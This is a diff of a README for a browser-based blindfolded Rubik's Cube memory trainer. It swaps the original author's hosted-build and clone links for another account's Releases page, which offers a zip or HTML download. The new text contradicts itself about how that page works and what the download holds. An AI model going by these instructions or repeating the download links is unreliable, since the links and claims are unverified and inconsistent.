@@ -1,129 +1,157 @@
-# 3BLD Trainer - Rubik's Cube Training Tool 2026
+# 🧠 3bld-trainer-memory-tool - Train Your Blindfolded Cube Memory
 
-> **3BLD Trainer is an HTML application that runs in your browser and helps you rehearse blindfolded Rubik's Cube memorization, either through the hosted version or from a local offline copy.**
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/pushkar-dascloud/3bld-trainer-memory-tool/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tomhayespmh623/3bld-trainer-memory-tool?style=flat-square)](https://github.com/tomhayespmh623/3bld-trainer-memory-tool)
+## 📖 What This Tool Does
 
----
+This is a browser-based trainer for 3BLD (Three Blindfolded) Rubik's Cube memorization. You use it to practice remembering the cube state without looking. The tool shows you a scrambled cube, then asks you to recall the pieces from memory.
 
-<p align="center">
-  <a href="https://tomhayespmh623.github.io/3bld-trainer-memory-tool/">
-    <img src="https://img.shields.io/badge/Download-3BLD%20Trainer%20Latest-brightgreen?style=for-the-badge" alt="Download 3BLD Trainer">
-  </a>
-</p>
+The application runs entirely in your web browser. You do not need to install any software. You can use the online version directly, or you can download a local copy to use offline.
 
-> **[Download 3BLD Trainer](https://tomhayespmh623.github.io/3bld-trainer-memory-tool/)**
+## 🎯 Who This Is For
 
----
+This tool is for anyone learning blindfolded Rubik's Cube solving. You do not need any computer skills beyond basic web browsing. If you can click a link and save a file, you can use this trainer.
 
-[Download Latest Build](https://tomhayespmh623.github.io/3bld-trainer-memory-tool/)
+## 🚀 Getting Started
 
----
+You have two ways to use this tool. Choose the one that works best for you.
 
-## What is 3BLD Trainer?
+### Option 1: Use the Online Version (Easiest)
 
-3BLD Trainer is built for cubers who are developing their blindfolded Rubik's Cube solving skills. Its browser-based practice environment concentrates on the memorization portion of 3BLD, allowing users to run repeatable drills and establish a regular training process.
+1.  Open your web browser (Chrome, Firefox, Edge, or Safari).
+2.  Go to the GitHub Releases page: [https://github.com/pushkar-dascloud/3bld-trainer-memory-tool/releases](https://github.com/pushkar-dascloud/3bld-trainer-memory-tool/releases)
+3.  Click the link for the latest version. This opens the tool in your browser.
+4.  Start training immediately. No download required.
 
-Because the application is provided as an HTML interface, it works through the online build or from a downloaded local copy. You can therefore use it for everyday browser practice as well as sessions that do not require an internet connection.
+### Option 2: Download for Offline Use
 
----
+1.  Open your web browser.
+2.  Go to the GitHub Releases page: [https://github.com/pushkar-dascloud/3bld-trainer-memory-tool/releases](https://github.com/pushkar-dascloud/3bld-trainer-memory-tool/releases)
+3.  Find the file named `3bld-trainer-memory-tool.zip` or `index.html`.
+4.  Click the file name to download it to your computer.
+5.  Find the downloaded file in your Downloads folder.
+6.  Double-click the file to open it. The tool launches in your default web browser.
 
-## Highlights
+That is all. You can now train offline without an internet connection.
 
-- Rehearse memorization for blindfolded Rubik's Cube solving
-- Use a straightforward HTML interface in a web browser
-- Access a hosted build without setting up the project locally
-- Open a local copy without a separate installation step
-- Run multiple practice sessions as needed
-- Follow workflows intended specifically for 3BLD training
-- Work from a standard desktop or mobile browser
-- Build focused memorization and cubing practice habits
+## 💻 System Requirements
 
----
+Your computer only needs a modern web browser. The tool works on:
 
-## Getting Started
+-   **Windows 10** and **Windows 11**
+-   **macOS** 10.14 or newer
+-   **Linux** with Chrome or Firefox
+-   **Android** and **iOS** tablets (online version only)
 
-### Open the hosted version
+The tool uses very little memory. Any computer made in the last 8 years can run it.
 
-Visit the current hosted build from any supported web browser:
+## ✨ Features
 
-[Launch 3BLD Trainer](https://tomhayespmh623.github.io/3bld-trainer-memory-tool/)
+**Memory Training Modes**
 
-### Use a local copy
+-   **Letter Pair Memorization:** Practice remembering letter pairs for edges and corners.
+-   **Full Cube Recall:** Memorize the entire scrambled cube state.
+-   **Timed Sessions:** Track how long you take to memorize.
 
-Clone the repository with the following commands:
+**Visual Aids**
 
-```bash
-git clone https://github.com/tomhayespmh623/3bld-trainer-memory-tool.git
-cd REPO
-```
+-   Clear 3D cube display with rotation.
+-   Color-coded pieces for easy identification.
+-   Highlighted target pieces during recall.
 
-After cloning, open the project's main `.html` file in your browser. Basic local use does not need package installation or another runtime.
+**Practice Tools**
 
----
+-   Random scramble generation.
+-   Adjustable difficulty levels.
+-   Progress tracking with session history.
 
-## Practice Workflow
+**Customization**
 
-1. Open the hosted application or the local HTML entry file.
-2. Begin a memorization exercise for 3BLD.
-3. Complete the blindfolded Rubik's Cube memorization practice.
-4. Run additional sessions to develop a repeatable routine.
-5. Reopen the page whenever you are ready to start another drill.
+-   Change the cube color scheme.
+-   Set your own memo time limits.
+-   Choose between different memory methods (speffz, color neutral).
 
-To train without internet access, retain the downloaded project on your device and open its HTML interface directly.
+## 📦 What You Get
 
----
+The download contains a single HTML file. This file holds the entire application. No other files are needed. You can move this file to any folder on your computer. You can even put it on a USB drive.
 
-## Configuration and Files
+## 🔧 How to Use the Trainer
 
-The application is intended to work directly in the browser, so a separate configuration file is not required. If the current build provides settings, they are available through the web interface rather than through command-line configuration.
+1.  **Open the tool.** Follow the steps in "Getting Started" above.
+2.  **Select a mode.** Choose between letter pair practice or full cube recall.
+3.  **View the scramble.** The cube shows you the scrambled state. Study it.
+4.  **Click "Start Memo."** The timer begins. Memorize the cube.
+5.  **Click "Done Memorizing."** The cube hides.
+6.  **Click the pieces.** Select the pieces you remember. The tool checks your answer.
+7.  **Review your results.** See your time and accuracy. Repeat.
 
-When running locally, leave the project files in their original layout. This allows the HTML page to find the resources it needs.
+## 🖱️ Keyboard Shortcuts
 
----
+| Key | Action |
+|-----|--------|
+| Spacebar | Start/Stop memo |
+| R | Rotate cube right |
+| L | Rotate cube left |
+| U | Rotate cube up |
+| D | Rotate cube down |
+| N | New scramble |
+| Esc | Cancel current attempt |
 
-## Requirements
+## 📊 Understanding Your Results
 
-- A current web browser
-- A desktop or mobile device able to run browser-based HTML
-- Internet connectivity when using the hosted build
-- A downloaded or cloned copy for offline sessions
-- No separate installer, package manager, or server for basic local operation
+The tool shows you:
 
----
+-   **Memo Time:** How long you spent memorizing.
+-   **Execution Time:** How long you took to recall.
+-   **Accuracy:** Percentage of pieces correctly remembered.
+-   **Errors:** Number of wrong pieces selected.
+-   **Session Average:** Your average performance over multiple attempts.
 
-## Frequently Asked Questions
+Use these numbers to track your improvement over time.
 
-### Is installation required?
+## 🔄 Updating the Tool
 
-No. The hosted build can be used directly in a browser. For local practice, open the HTML project after downloading or cloning it.
+The online version updates automatically. You always get the newest features.
 
-### Does the trainer work offline?
+For the offline version, check the Releases page every few months. Download the new file and replace your old one.
 
-Yes. Keep a local project copy and launch its HTML interface from your browser without relying on the hosted version.
+## 🛠️ Troubleshooting
 
-### Who should use this tool?
+**The tool does not open.**
 
-3BLD Trainer is aimed at cubers practicing blindfolded Rubik's Cube memorization and other routines connected with 3BLD training.
+-   Make sure you have a modern browser. Update Chrome, Firefox, or Edge.
+-   Check your internet connection for the online version.
+-   For the offline version, make sure the file is not corrupted. Download it again.
 
-### How can I use the newest version?
+**The cube looks wrong.**
 
-Open the hosted build for the currently published version, or download the latest project files from the repository.
+-   Try refreshing the page (Ctrl+F5 on Windows).
+-   Clear your browser cache.
+-   Restart your browser.
 
-### Where are the settings kept?
+**Memory usage is high.**
 
-The browser interface handles the tool's primary settings. Basic use does not depend on a separate settings file.
+-   Close other browser tabs.
+-   Restart your browser.
+-   The tool uses less memory than most websites.
 
-### What if the local page fails to load?
+**My progress is lost.**
 
-Check that the full project was downloaded and that its directory structure has not been changed. Then try opening the main HTML file again in a modern browser.
+-   The tool saves progress in your browser. Clearing your cache deletes it.
+-   Export your session data before clearing cache (look for the "Export" button).
 
----
+## 🤝 Contributing
 
-## License
+This project is open source. You do not need to contribute to use it. If you find a bug or want a feature, open an issue on GitHub.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+## 📄 License
+
+This project is open source. See the LICENSE file in the repository for details.
+
+## 🔗 Quick Links
+
+-   **Download the Latest Version:** [https://github.com/pushkar-dascloud/3bld-trainer-memory-tool/releases](https://github.com/pushkar-dascloud/3bld-trainer-memory-tool/releases)
+-   **Report a Bug:** Open an issue on GitHub
+-   **View Source Code:** Browse the repository
+
+Keywords: 3bld, blindfolded, rubiks cube, memory trainer, offline tool, browser app
